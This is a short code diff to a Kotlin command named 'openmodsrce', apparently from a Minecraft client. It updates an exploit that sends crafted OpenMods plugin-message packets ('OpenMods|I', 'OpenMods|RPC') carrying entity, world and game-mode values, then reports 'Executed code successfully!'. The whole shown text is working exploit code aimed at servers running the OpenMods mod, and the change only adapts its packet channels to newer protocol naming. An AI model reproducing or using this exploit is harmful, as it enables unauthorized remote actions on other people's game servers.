@@ -68,7 +68,7 @@ class CommandOpenModsRCE : Command("openmodsrce") {
         output.writeInt(1337)
         closer.close()
 
-        TarasandeProtocolSpoofer.enforcePluginMessage("OpenMods|I", payload.copy().array(), remap = true)
+        TarasandeProtocolSpoofer.enforcePluginMessage("openmods:i", "OpenMods|I", payload.copy().array())
         payload = Unpooled.buffer()
 
         output = DataOutputStream(ByteBufOutputStream(payload))
@@ -77,7 +77,7 @@ class CommandOpenModsRCE : Command("openmodsrce") {
         output.writeInt(entityId)
         writeVLI(output, worldId)
         writeVLI(output, gameMode.id)
-        TarasandeProtocolSpoofer.enforcePluginMessage("OpenMods|RPC", payload.copy().array(), remap = true)
+        TarasandeProtocolSpoofer.enforcePluginMessage("openmods:rpc", "OpenMods|RPC", payload.copy().array())
 
         CustomChat.printChatMessage("Executed code successfully!")
     }
